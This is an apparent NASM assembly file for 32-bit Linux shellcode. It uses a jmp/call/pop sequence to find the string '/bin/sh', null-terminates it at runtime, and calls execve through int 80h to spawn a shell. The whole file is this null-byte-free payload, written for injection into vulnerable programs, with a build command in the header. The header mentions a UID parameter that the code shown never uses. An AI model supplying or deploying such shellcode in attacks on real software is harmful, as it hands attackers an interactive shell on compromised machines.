;
;	assemble with nasm sh.asm -o sh.bin -DUID=<someuid>
;	NOTE: UID must be at least 2 bytes long to avoid null byte

USE32

	section .data
	global _start

_start:
    jmp shell

execve:
	pop ebx
    mov edi, ebx
    xor eax, eax
    mov al, 0x90    ; search for nop
    mov cl, 0xff    ; search up to 255 bytes
    cld
    repne scasb
    dec edi
    xor ecx, ecx
    mov [edi], cl   ; put the null byte

	mov dword [esp], ebx
	mov dword [esp + 4], ecx
	mov ecx, esp
	xor eax, eax
	mov edx, eax
	mov al, 0xb
	int 80h

shell:
        call execve
        db "/bin/sh"
term:
        nop	
